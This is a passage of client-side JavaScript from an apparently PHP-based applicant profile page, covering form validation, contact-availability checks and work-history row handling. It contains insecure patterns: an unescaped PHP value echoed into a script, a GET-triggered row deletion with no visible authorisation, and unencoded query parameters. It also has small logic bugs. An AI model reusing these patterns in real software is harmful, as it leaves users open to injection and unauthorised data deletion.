		heightIn = parseInt(heightIn);
		var weight = document.getElementById('weight').value;
		weight = parseInt(weight);
		var numChildren = document.getElementById('numChildren').value;
		var hs = document.getElementById('hs').value;
		var hsEndYr = document.getElementById('hsEndYr').value;
		var college = document.getElementById('college').value;
		var collegeEndYr = document.getElementById('collegeEndYr').value;
		var collegeDegree = document.getElementById('collegeDegree').value;
		var vocationalSchool = document.getElementById('vocationalSchool').value;
		var vocationalEndYr = document.getElementById('vocationalEndYr').value;
		var vocationalDegree = document.getElementById('vocationalDegree').value;
		var mNumber1 = document.getElementById('mobile1').value;
		var mNumber2 = document.getElementById('mobile2').value;
		var mNumber3 = document.getElementById('mobile3').value;
		var email = document.getElementById('email').value;
		var username = <?php echo $username; ?>;
		
		fields.push(street, birthPlace, heightFt, heightIn, weight, numChildren, hs, college, collegeDegree, vocationalSchool, vocationalDegree);
		requiredFields.push(1,1,0,0,0,1,0,0,0,0,0);
		
		for (var f = 0; f < fields.length; f++) {
			var fElem = fields[f];
			var fReq = requiredFields[f];
			if(fReq > 0 && fElem.match(/^\s*$/)){
				errors = 1;
				errorMsg = "<li>Please make sure that all required fields are filled.</li>";
			}
		}
		
		if(heightFt<4 || heightFt > 10){
			errorMsg += "<li>Inputted <strong>height in ft.</strong> should not be lesser than 4 ft. or greater than 10 ft.</li>";
			errors +=1;
		}
		
		if(heightIn<0 || heightIn > 11){
			errorMsg += "<li>Inputted <strong>height in in.</strong> should not be lesser than 0 in. or greater than 11 in.</li>";
			errors +=1;
		}
		
		if(bDateYear<minBirthYear || bDateYear>maxBirthYear){
			errorMsg += "<li>Inputted <strong>age</strong> should  be between 17-60 years old.</li>";
			errors +=1;
		}
		
		if(hs === "" && hsEndYr !==""){
			errorMsg += "<li>Provide <strong>high school name</strong>.</li>";
			errors +=1;
		}
		
		if(college === "" && (collegeEndYr!=="" && collegeDegree !== "") || (collegeEndYr!=="" && collegeDegree === "") || (collegeEndYr==="" && collegeDegree !== "")){
			errorMsg += "<li>Provide <strong>college name</strong>.</li>";
			errors +=1;
		}
		
		if(vocationalSchool === "" && (vocationalEndYr!=="" && vocationalDegree !== "") || (vocationalEndYr!=="" && vocationalDegree === "") || (vocationalEndYr==="" && vocationalDegree !== "")){
			errorMsg += "<li>Provide <strong>vocational school name</strong>.</li>";
			errors +=1;
		}
		
		//check mobile number
		// if(mNumber1 === "" || mNumber2 === "" || mNumber3 === ""){
			// errorMsg += "<li>Make sure that <strong>mobile number </strong>is 11 digits long.</li>";
			// errors +=1;
		// }
		// else{
			// var mobile = mNumber1 + mNumber2 + mNumber3;
			// var isMobileAvailable = checkAvailability(username, "mobile_num", mobile);
			// if(isMobileAvailable=="false"){
				// errorMsg += "<li>Inputted <strong>mobile number</strong> is already taken. Provide another one.</li>";
				// errors +=1;
			// }
		// }
		
		//check email address availability
		// if(email !== ""){
			// var isEmailAvailable = checkAvailability(username, "email", email);
			// if(isEmailAvailable=="false"){
				// errorMsg += "<li>Inputted <strong>email address</strong> is already taken. Provide another one.</li>";
				// errors +=1;
			// }
		// }
	
		if(errors>0){
			document.getElementById('errorContent').innerHTML = errorMsg;
			$("#errorModal").modal('show');
		}
		else{
			$(this).ajaxSubmit(); 
			$("#myModal").modal('show');
			return true;
		}
		return false;
    });
});

function checkAvailability(username, type, value){
	var hr = new XMLHttpRequest();
	var url = "verify-contact-number.php?username="+username+"&type="+type+"&value="+value;
	result = "";
	hr.open("GET", url, false);
	hr.onreadystatechange = function() {
		if(hr.readyState == 4 && hr.status == 200) {
			var return_data = hr.responseText;
			result = return_data;
		}
	}
	hr.send(null); 
	return result;
}

function more() {
	document.getElementById("add-more-btn").style.display = "none";
	document.getElementById("more").style.display = "block";
}

//ADD EXTRA FIELDS FOR WORK HISTORY
function addThisField(inptBtn) {
	var nxtVal = parseInt(inptBtn) + 1;
	var currReqFieldName = "add" + inptBtn;
	var nxtReqFieldName = "add" + nxtVal.toString();
	var btnName = "addBtn" + inptBtn;
	var icoName = "icon" + inptBtn;
	var currFieldStat = document.getElementById(currReqFieldName).style.display;
	var nxtFieldStat = document.getElementById(nxtReqFieldName).style.display;
	var btnType = document.getElementById(btnName).className;
	//change add button type
	if(btnType == "btn-primary btn-mini"){
		document.getElementById(btnName).className="btn-inverse btn-mini";
		document.getElementById(icoName).className="icon-minus-sign icon-white";
		document.getElementById(nxtReqFieldName).style.display="block";
	}
	else{
		document.getElementById(currReqFieldName).style.display="none";
	}
}
	
//REMOVE OLD FIELDS FOR WORK HISTORY
function removeThisField(inptBtn, rowNum) {
	var currReqFieldName = "add" + inptBtn;
	var companyName = "coNameOld" + inptBtn;
	var positionName = "positionOld" + inptBtn;
	var startMonthName = "startMonthOld" + inptBtn;
	var endMonthName = "endMonthOld" + inptBtn;
	$.ajax({
	   type: "GET",
	   url: "delete-row.php?rownum="+rowNum,
	   cache: false,
	   success: function(result){
		//document.getElementById("answer").innerHTML = result;
		document.getElementById(currReqFieldName).style.display="none";
		document.getElementById(companyName).value="";
		document.getElementById(positionName).value="";
		document.getElementById(positionName).value="";
		document.getElementById(endMonthName).value="";
	   }
	});
}

function changeAccountInfo() {
	window.location.href="change-password.php";
}

function removeOption(inptVal){
	alert(inptVal);
}
</script>
<script>
function enableHSStatus(){
	var hs = document.getElementById('hs').value;
	
	if(!hs.match(/^\s*$/)){
		document.getElementById('hsEduc1').disabled="";
		document.getElementById('hsEduc2').disabled="";
		document.getElementById('hsEduc3').disabled="";
	}
	else{
		document.getElementById('hsEduc1').disabled="disabled";
		document.getElementById('hsEduc2').disabled="disabled";
		document.getElementById('hsEduc3').disabled="disabled";
		$('input[name=hsEduc]').attr('checked',false);
	}
}

function enableCollegeStatus(){
	var college = document.getElementById('college').value;
	if(!college.match(/^\s*$/)){
		document.getElementById('collegeEduc1').disabled="";
		document.getElementById('collegeEduc2').disabled="";
		document.getElementById('collegeEduc3').disabled="";
	}
	else{
		document.getElementById('collegeEduc1').disabled="disabled";
		document.getElementById('collegeEduc2').disabled="disabled";
		document.getElementById('collegeEduc3').disabled="disabled";
		$('input[name=collegeEduc]').attr('checked',false);
	}
}

function enableVocSchoolStatus(){
	var vocationalSchool = document.getElementById('vocationalSchool').value;
	
	if(!vocationalSchool.match(/^\s*$/)){
		document.getElementById('vocationalEduc1').disabled="";
		document.getElementById('vocationalEduc2').disabled="";
		document.getElementById('vocationalEduc3').disabled="";
	}
	else{
		document.getElementById('vocationalEduc1').disabled="disabled";
		document.getElementById('vocationalEduc2').disabled="disabled";
		document.getElementById('vocationalEduc3').disabled="disabled";
		$('input[name=vocationalEduc]').attr('checked',false);
	}
}

function fillCompanyName(id){
	var positionName = "position" + id;
	var startMonthName = "startMonth" + id;
	var endMonthName = "endMonth" + id;
	document.getElementById(positionName).required=true;
	document.getElementById(startMonthName).required=true;
	document.getElementById(endMonthName).required=true;
}

function viewResumeEmp(){
	var username = document.getElementById('username').value;
	window.open("view-resume.php?username="+username, '_blank');
}

</script>
<!-- JS scripts -->
</body>
</html>